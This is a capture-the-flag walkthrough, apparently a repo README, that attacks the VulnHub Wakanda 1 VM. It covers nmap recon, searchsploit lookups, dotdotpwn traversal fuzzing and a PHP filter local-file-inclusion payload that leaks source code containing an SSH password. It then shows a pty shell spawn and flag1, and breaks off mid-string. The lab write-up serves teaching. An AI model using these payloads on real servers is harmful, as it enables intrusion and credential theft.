# Welcome to Wakanda  
**A New Breed of CTF!**  
Our mission is simple, the task is challenging, but the reward will be amazing!  
By the end of this mission, you will be 1 step closer to becoming an 3L1T3 H4CK3R! Will you take the challenge and rise to the top?  
  
The resources & knowledge I put into this is to help everyone else become an amazing hacker. If you have found this repo useful and helpful, please consider buying me a cup of coffee;  
BTC ADR:  
bc1q7np8xjmz40knvu6lma8xqmqkpwkssmwpmq9vw0  
  
## Wakanda Setup & Description  
**What is Wakanda?**  
Think of it like you are a special agent and you are trying to help secure the Marvel Paradise of Wakanda. We all know that they mine Vibranium right? But there are dangers lurking around every corner.  
  
**Wakanda Description:**  
"A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine."  
  
**Wakanda Flags:**  
There are 3 Known flags inside the VM (flag1.txt, flag2.txt, root.txt)  
Our mission is to collect all 3 of these flags!  
The only intel you are allowed to have is;  
* DHCP: Enable This  
* IP Address: Automatically Assign This  
* Follow Your Intuitions  
* And Remember to Enumerate!  
**Happy Hacking**  
  
**Download Wakanda**  
We need to download the VM from the source. We are getting the Virtual Machine from a popular website "VulnHub" (https://www.vulnhub.com).  
If you are following this repo, we will be downloading the following Virtual Machine from that site;  
https://www.vulnhub.com/entry/wakanda-1,251/  
This download should already be a ".ova" file, so we just need double click on this ".ova" file and import this into our VirtualBox.   
  
If you do not already have VirtualBox, you can download it for free here;  
https://www.virtualbox.org/wiki/Downloads  
  
After you have downloaded & double clicked on the ".ova" to import the configurations, you need to make some minor adjustments to your network drivers on this VM.  
Set the Network Drivers to "Nat Network" and select the Hacking Network you have already setup & configured.  
  
Once that is done, fire up the machine and you should see a Debian boot loading screen, just click "enter" and then you will be directed to a Debian GNU/Linux Login Screen.  
  
This is where the fun begins. We need to crack this login screen to get access to the VM!  
  
## Detecting the Wakanda Virtual Machine  
**Congrats On Loading The VM!** If you have done everything correct, you should be faced with a default terminal style log in screen. And now the fun can begin!  
  
Now, the first thing we need to figure out, we do not even know what the IP Address of that VM is. So we will perform a simple netdiscover command like so;  
```
$ sudo netdiscover -r 10.0.0.0/24
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 10.0.0.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 10.0.0.3        08:00:27:31:f8:b3      1      60  PCS Systemtechnik GmbH                                                                                                                                                                  
 10.0.0.6        08:00:27:60:fb:91      1      60  PCS Systemtechnik GmbH
```
  
Now it is time to see what ports are opened up on our target. In my case, my target is 10.0.0.6. Let's open a new tab and use nmap in order to discover ports.  
  
```
$ sudo nmap -sS -sV -A -p- 10.0.0.6  
Nmap scan report for 10.0.0.6
Host is up (0.00032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Vibranium Market
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39413/tcp   status
|   100024  1          41563/udp   status
|   100024  1          42132/tcp6  status
|_  100024  1          48816/udp6  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c984756fcb814088f93ca36447fea7a (DSA)
|   2048 f1d50478d33a9bdc13df0f5f7ffbf426 (RSA)
|   256 d834415d9bfe51bcc64e02145ee108c5 (ECDSA)
|_  256 0ef58d293c7357c738086d5084b66c27 (ED25519)
39413/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:60:FB:91 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 10.0.0.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds

```
**ALRIGHT!** Looks like we have several ports that are opened up including "SSH" This should be pretty awesome to get into!  

So, what do we do now? I would recommend creating a new notes folder so that you can use it to save your information for later. In my case, this repo is indeed my notes! LOL  
  
Once you have created your file for note taking, copy/paste the results of your NMap scan.  
  
Now we are ready to analyze the results from the machine. 

## Analyzing Wakanda VM  
Now that we have performed our NMap scan and obtain the results back, it is time to start working away at this thing!  
  
We can see that there is Port 80 opened up. And we also know it is an Apache port as well! Naturally, we will be looking more into that and see what else is in there.  
We can also see that there is rpcbind 2-4. Maybe we can find an expliot for this. We can do a terminal exploit search in our Kali machines like this;  
```
$ searchsploit rpcbind  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
rpcbind - CALLIT procedure UDP Crash (PoC)                                                                                                                                                                | linux/dos/26887.rb
RPCBind / libtirpc - Denial of Service                                                                                                                                                                    | linux/dos/41974.rb
Wietse Venema Rpcbind Replacement 2.1 - Denial of Service                                                                                                                                                 | unix/dos/20376.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
So instead of running to Google with thousands upon thousands of results, we can narrow the results down on our terminal screens by selecting what we want to search for! In this case "rpcbind".  
  
But what if we wanted to search for something specific? Like the Apache Server we discover running on 2.4.10? We can look into that with the same searchsploit command like this;  
```
$ searchsploit Apache 2.4.10  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                                           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                                         | php/remote/29316.py
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                                          | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                                                       | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                                                       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                                                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                                                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                                                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                                              | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                                              | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                                              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                                          | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
And now we can see a ton of exploits that are available with this version of Apache that our target is using.  
We also know that there is port 3333 opened up for ssh. What would happen if we try to SSH into this? Let's find out;  
```
**We will be using default "root" as the username**  
$ ssh root@10.0.0.6 -p 3333  
The authenticity of host '[10.0.0.6]:3333 ([10.0.0.6]:3333)' can't be established.
ED25519 key fingerprint is SHA256:+RDNDlJdB+fOwaBcN7BUj0YXi8V0MD73WDDDNefS39I.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.0.0.6]:3333' (ED25519) to the list of known hosts.
root@10.0.0.6's password: 
```
Well, looks like we are faced with yet another Password blocking. Hmm. Let's come back to that in a little bit!  
  
But for right now, I want to focus on the Port 80 running Apache right now.   
What exactly does that mean? Well, since we have the Wakanda VM opened up on another instance, we can use Kali Linux and open up FireFox. Then we want to navigate to the IP Address of the Wakanda vm. In my case, the machine 
IP Address is 10.0.0.6. And when I go to that page, I can see the Wakanda market landing page. I can even view the page source code. Which by looking at the source code, it is just a default html site with no external links 
or internal links either.
However, there is indeed an interesting comment inside of the code. Let's take a look at this line here;
```
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
```
Now this line is commented out, however it is a link that allows us to us this in the url;
```
10.0.0.6/?lang=fr
```
And by doing this, we can easily see that the main paragraph of the website changes to French.  
Now that is interesting as we are now able to see the website in French writing. However, outside of seeing this in another language, we can also consider this as we can see a potential vulnerability as this takes in a parameter and we can think about things like directory vulnerability that we can not see.  
When we talk about directory vulnerability, we can do a different setup of structures in the URL like this;  
```
10.0.0.6/?lang=../../../etc/passwd
```
In this case, it does nothing. However, we do not know what all is on this server. And maybe a tool like DotDotPwn to test the target for other directories. In fact, let us go ahead and try that now. Just to get it out of the way!  
  
```
**PLEASE NOTE:** This will take a long time to complete. So run the command and we will return when the scan is complete. You can watch the command execute, or go get some lunch. You will be okay ;)  
  

$ dotdotpwn -h 10.0.0.6 -m http  
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                              - DotDotPwn v3.0.2 -                             #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216etc%u2216passwd
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216etc%u2216issue
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216etc%u2216passwd
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216etc%u2216issue
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216..%u2216etc%u2216passwd
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216..%u2216etc%u2216issue
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216issue
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd
[*] HTTP Status: 400 | Testing Path: http://10.0.0.6:80/..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216issue

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8setc%c1%8spasswd <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8setc%c1%8sissue <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8spasswd <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8sissue <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8spasswd <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8sissue <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8spasswd <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8sissue <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8spasswd <- VULNERABLE!

[*] Testing Path: http://10.0.0.6:80/.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8s.?%c1%8setc%c1%8sissue <- VULNERABLE!
```
And we can easily see that there are some **VULNERABLE** directories! Now, we can just copy and paste them into the URL Bar and see what happens!  

Now, even though we have a multitude of different vulnerable URL's, and we are not getting anywhere. But if we keep trying we may actually find something!
  
So I will keep trying multiple versions of these for about 30ish minutes and see what I can find.  
**Stay Tuned**.........................
After a lengthy test on multiple different programs and reading all over Google, I finally discovered a vulnerability on our target.  
I was reading a great GitHub Book;  
htps://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter  
And was was able to discover a very simple URL Vulnerability. In this case, I was able to use this URL in the browser;  
```
10.0.0.6/?lang=pHp://FilTer/convert.base64-encode/resource=index 
```
And basically what this URL String does is it checks to see if there are any Base64 algorithms that are on the website. And sure enough, I get this strange string of numbers & letters;  
```
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
```
And now we already know that this is Base64 from the vulnerable URL encoding, let's see if we have the ability to decode this string!  
Now, in order to use a Decoder for Base64, I just went online and found one that would work most ideal for us. You can visit the same website here;  
https://www.base64decode.org/  
  
And when I put that string inside, and clicked on Decode, I got this message;  
```
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}

?>
```
Okay. So it looks like we have ourselves a password. Naturally, what I want to do is SSH into this server with username "root" and the password (hopefully) should be "Niamey4Ever227!!!"...  
Let's find out!  
```
$ ssh root@10.0.0.6 -p 3333  
root@10.0.0.6's password: 
Permission denied, please try again.
root@10.0.0.6's password: 
Permission denied, please try again.
root@10.0.0.6's password: 
root@10.0.0.6: Permission denied (publickey,password).
```
Well, while the "root" username did not work properly, let's not forget about the main website. Remember on the bottom of the page we saw "made by mamadou". So. Instead of giving up on "root" as the username, let's try 
mamadou as the username!  
```
$ ssh mamadou@10.0.0.6 -p 3333  
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug  3 15:53:29 2018 from 192.168.56.1
Python 2.7.9 (default, Jun 29 2016, 13:08:31) 
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
```
***HOLY FREAKING COW!*** We just got access to this server! This was 1000% total fun!  
  
## Gathering More Information  
*Now that we gained access to the server VIA SSH commands, we need to see what other information we can obtain!*  
Naturally, our normal instincts should say do some basic recon commands...Such as;  
```
$ whoami  
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'whoami' is not defined  
  
$ ls  
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'ls' is not defined
```
However, we can clearly see that these are not working. Why is this? This is because we are not in a Shell. So what can we do? Let's see if we can run some basic commands;  
```
**Let's create a basic variable. We are going to test out some Scripting Methods;**  
  
>>> myname="CryptoH4ck3r"  
>>> print(myname)  
CryptoH4ck3r  
>>>   
```
  
Okay cool! This appears to be a type of Python shell. And we can read that from the starting text when it says that it is Python 2.7.9. How does this help us? We can install a Python Shell. What we are going to do is Spawn a Shell through Python.  
  
The way we are going to do that is by searching "How to spawn a shell in python". And I came across this link;  
https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html  
Hmm. Looks good enough for me! Let's plug it and see what happens;  
```
>>> python -c 'import pty; pty.spawn("/bin/sh")'
  File "<stdin>", line 1
    python -c 'import pty; pty.spawn("/bin/sh")'
                                               ^
SyntaxError: invalid syntax
```
Okay, that did not work well for us. Why? We need to import pty like so;  
```
>>> import pty  
  
>>> pty.spawn("/bin/bash")  
  
mamadou@Wakanda1:~$ 
```
**PERFECT!** Now we actually have a Linux-Based shell we can use. Let's try some basic commands to see if it works like it should;  
```
$ whoami  
mamadou  
  
$ ls  
flag1.txt
```
***BET!!!!*** We just found our first flag! Let's cat that and see what it says!  
  
```
$ cat flag1.txt  
Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
```
NICE! We got our first flag! If I where you, I would copy/paste this into our notes we have kept up.  
In fact, now would be a great time to check out our notes and ensure that we have everything we need saved. Your notes should look something like this;  
  
```
$ cat WakandaCTF.txt  
Target IP (netdiscover)  
10.0.0.6

NMap Scan;  

Nmap scan report for 10.0.0.6
Host is up (0.00032s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Vibranium Market
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39413/tcp   status
|   100024  1          41563/udp   status
|   100024  1          42132/tcp6  status
|_  100024  1          48816/udp6  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c984756fcb814088f93ca36447fea7a (DSA)
|   2048 f1d50478d33a9bdc13df0f5f7ffbf426 (RSA)
|   256 d834415d9bfe51bcc64e02145ee108c5 (ECDSA)
|_  256 0ef58d293c7357c738086d5084b66c27 (ED25519)
39413/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:60:FB:91 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 10.0.0.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds
  
  
Reasearched Vulnerabilities (searchsploit Apache 2.4.10)  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                                           | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                                         | php/remote/29316.py
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                                          | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                                                       | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                                                       | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                                                         | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                                                       | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                                                 | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                                              | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                                              | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                                              | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                                          | linux/remote/34.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
    
  
View Website Details  
Discovered "Made By mamadou"  
  
Exploited URL Vulnerabilities;  
10.0.0.6/?lang=php://filter/convert.base64-encode/resource=index

Discovered Base64 String;  
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgIC